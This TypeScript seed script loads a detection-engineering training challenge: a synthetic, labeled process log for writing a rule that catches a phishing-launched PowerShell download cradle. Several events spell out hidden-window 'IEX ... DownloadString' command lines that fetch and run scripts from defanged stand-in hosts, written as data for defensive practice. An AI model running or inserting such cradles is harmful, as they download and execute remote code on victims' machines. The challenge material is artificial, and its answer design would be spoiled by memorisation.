// Seeds the Detection Validation Engine's first challenge: a synthetic,
// pre-labeled event log built around the PowerShell download-cradle pattern
// used across several Incident Simulations in this platform.
//
// The dataset is deliberately designed so that a naive single-condition
// rule (e.g., "process = powershell.exe" alone) scores poorly on precision,
// while a well-chosen two-condition rule reaches ~89% precision / 100%
// recall — good enough to pass, but not a trivial 100%, so the exercise
// still teaches the precision/recall tradeoff rather than having one
// "obviously perfect" answer.
//
// Idempotent — safe to run multiple times. Run: npx tsx scripts/seed-detection-challenges.ts

import { PrismaClient } from "@prisma/client";

const db = new PrismaClient();

type Ev = { id: string; raw: string; fields: Record<string, string>; isMalicious: boolean };

function mkEvent(
  id: string,
  host: string,
  user: string,
  process: string,
  parent: string,
  commandline: string,
  isMalicious: boolean
): Ev {
  return {
    id,
    raw: `Process Create — Host: ${host} | User: ${user} | Image: ${process} | ParentImage: ${parent} | CommandLine: ${commandline}`,
    fields: { host, user, process, parent, commandline },
    isMalicious,
  };
}

const EVENTS: Ev[] = [
  // ── Malicious: PowerShell download cradle launched from a phishing lure ──
  mkEvent("e01", "FIN-WKS-021", "jdoe", "powershell.exe", "EXCEL.EXE", "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('hxxp://cdn-relay-01.net/a.ps1')", true),
  mkEvent("e02", "OPS-WKS-114", "mchen", "powershell.exe", "EXCEL.EXE", "powershell.exe -nop -w hidden -enc SQBFAFgA... -c DownloadString('hxxp://cdn-relay-01.net/a.ps1')", true),
  mkEvent("e03", "HR-WKS-057", "aosei", "powershell.exe", "WINWORD.EXE", "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('hxxp://cdn-relay-01.net/b.ps1')", true),
  mkEvent("e04", "REC-WKS-208", "kivanova", "powershell.exe", "EXCEL.EXE", "powershell.exe -w hidden -c IEX(New-Object Net.WebClient).DownloadString('hxxp://cdn-relay-01.net/a.ps1')", true),
  mkEvent("e05", "ADM-WKS-332", "rpatel", "powershell.exe", "WINWORD.EXE", "powershell.exe -nop -c DownloadString('hxxp://cdn-relay-01.net/b.ps1') | IEX", true),
  mkEvent("e06", "CLN-WKS-441", "twhitfield", "powershell.exe", "EXCEL.EXE", "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('hxxp://cdn-relay-02.net/a.ps1')", true),
  mkEvent("e07", "FIN-WKS-099", "nsilva", "powershell.exe", "EXCEL.EXE", "powershell.exe -w hidden -enc <base64> -c DownloadString('hxxp://cdn-relay-02.net/a.ps1')", true),
  mkEvent("e08", "OPS-WKS-276", "chaddad", "powershell.exe", "WINWORD.EXE", "powershell.exe -nop -c IEX(New-Object Net.WebClient).DownloadString('hxxp://cdn-relay-02.net/b.ps1')", true),

  // ── False-positive traps: designed to break naive single-condition rules ──
  mkEvent(
    "fp01",
    "FIN-WKS-015",
    "dmartinez",
    "powershell.exe",
    "EXCEL.EXE",
    "powershell.exe -File C:\\Corp\\Scripts\\quarterly_reconcile.ps1 -Signed",
    false
  ),
  mkEvent(
    "fp02",
    "IT-DEPLOY-01",
    "svc_sccm",
    "powershell.exe",
    "svchost.exe",
    "powershell.exe -nop -c IEX(New-Object Net.WebClient).DownloadString('https://sccm.internal.corp/deploy/patch_kb5031.ps1')",
    false
  ),
  mkEvent(
    "fp03",
    "FIN-WKS-088",
    "gnovak",
    "cmd.exe",
    "EXCEL.EXE",
    "cmd.exe /c powershell -c DownloadString('hxxp://cdn-relay-01.net/a.ps1')",
    false
  ),
  mkEvent(
    "fp04",
    "HR-WKS-203",
    "lreyes",
    "powershell.exe",
    "WINWORD.EXE",
    "powershell.exe -File C:\\Corp\\Scripts\\compliance_check_2026.ps1",
    false
  ),

  // ── True negatives: unrelated benign activity ──────────────────────────
  mkEvent("tn01", "FIN-WKS-021", "jdoe", "notepad.exe", "explorer.exe", "notepad.exe C:\\Users\\jdoe\\Documents\\notes.txt", false),
  mkEvent("tn02", "OPS-WKS-114", "mchen", "chrome.exe", "explorer.exe", "chrome.exe --profile-directory=Default", false),
  mkEvent("tn03", "HR-WKS-057", "aosei", "outlook.exe", "explorer.exe", "outlook.exe /recycle", false),
  mkEvent("tn04", "REC-WKS-208", "kivanova", "teams.exe", "explorer.exe", "teams.exe --processStart Teams.exe", false),
  mkEvent("tn05", "ADM-WKS-332", "rpatel", "excel.exe", "explorer.exe", "EXCEL.EXE C:\\Users\\rpatel\\Documents\\budget_q3.xlsx", false),
  mkEvent("tn06", "CLN-WKS-441", "twhitfield", "winword.exe", "explorer.exe", "WINWORD.EXE C:\\Users\\twhitfield\\Documents\\memo.docx", false),
  mkEvent("tn07", "FIN-WKS-099", "nsilva", "acrord32.exe", "explorer.exe", "AcroRd32.exe C:\\Users\\nsilva\\Downloads\\invoice.pdf", false),
  mkEvent("tn08", "OPS-WKS-276", "chaddad", "slack.exe", "explorer.exe", "slack.exe --process-start-args", false),
  mkEvent("tn09", "FIN-WKS-015", "dmartinez", "svchost.exe", "services.exe", "svchost.exe -k netsvcs -p", false),
  mkEvent("tn10", "IT-DEPLOY-01", "svc_sccm", "msiexec.exe", "svchost.exe", "msiexec.exe /i patch_kb5031.msi /quiet", false),
  mkEvent("tn11", "FIN-WKS-088", "gnovak", "cmd.exe", "explorer.exe", "cmd.exe /c dir C:\\Reports", false),
  mkEvent("tn12", "HR-WKS-203", "lreyes", "powershell.exe", "explorer.exe", "powershell.exe Get-Service | Where-Object Status -eq Running", false),
];

async function main() {
  await db.detectionChallenge.upsert({
    where: { slug: "phishing-powershell-cradle" },
    update: {
      title: "Detect: PowerShell Download Cradle",
      description:
        "Twenty-four process-creation events were pulled from fleet telemetry after a phishing campaign. Some are " +
        "the actual malicious PowerShell download cradle; others are deliberately similar-looking benign activity " +
        "(legitimate IT deployment scripts, signed internal automation, and unrelated processes). Build a rule out " +
        "of field/operator/value conditions that flags the malicious events while minimizing false positives. " +
        "Available fields: host, user, process, parent, commandline. You need both precision and recall at 80% or " +
        "higher to pass — a rule that's too broad or too narrow will fail one or the other.",
      difficulty: "HARD",
      points: 350,
      published: true,
      events: EVENTS,
    },
    create: {
      slug: "phishing-powershell-cradle",
      title: "Detect: PowerShell Download Cradle",
      description:
        "Twenty-four process-creation events were pulled from fleet telemetry after a phishing campaign. Some are " +
        "the actual malicious PowerShell download cradle; others are deliberately similar-looking benign activity " +
        "(legitimate IT deployment scripts, signed internal automation, and unrelated processes). Build a rule out " +
        "of field/operator/value conditions that flags the malicious events while minimizing false positives. " +
        "Available fields: host, user, process, parent, commandline. You need both precision and recall at 80% or " +
        "higher to pass — a rule that's too broad or too narrow will fail one or the other.",
      difficulty: "HARD",
      points: 350,
      published: true,
      events: EVENTS,
    },
  });

  console.log(`✓ Detection challenge seeded: phishing-powershell-cradle (${EVENTS.length} events).`);
}

main()
  .catch((e) => {
    console.error(e);
    process.exit(1);
  })
  .finally(() => db.$disconnect());
